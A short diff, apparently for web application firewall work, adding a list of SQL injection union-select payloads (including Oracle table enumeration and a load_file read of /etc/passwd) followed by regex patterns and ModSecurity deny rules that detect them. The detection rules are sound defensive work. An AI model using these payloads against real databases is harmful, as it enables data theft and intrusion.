@@ -1,0 +1,22 @@
+'union select all 1,2,x,x,x,x -
+'union select 1,2,3,x,x,x,x,@@version,x-
+'union+select+banner,null,null.null,null+from+v$version-
+'union+select+global_name,null,null,null,null+from+global_name-
+'union+select+owner,null,null,null,null+from+all_tables-
+'union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual-
+'union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual-
+%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual-
+2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+
+
+((((('|%[0-9]*|[0-9]*\+)(union))(\s|\+|\+\()(select)(\+|\s))).*)
+
+(('|%[0-9]*|[0-9]*\+)union(\s|\+|\+\()select(\+|\s)).*
+
+
+SecRule ARGS:search "((((('|%[0-9]*|[0-9]*\+)(union))(\s|\+|\+\()(select)(\+|\s))).*)" log,deny,status:404
+
+
+SecRule ARGS:uid "(?i)(?:[\`|\%\d]+(union|select)(?=\s|\+))"
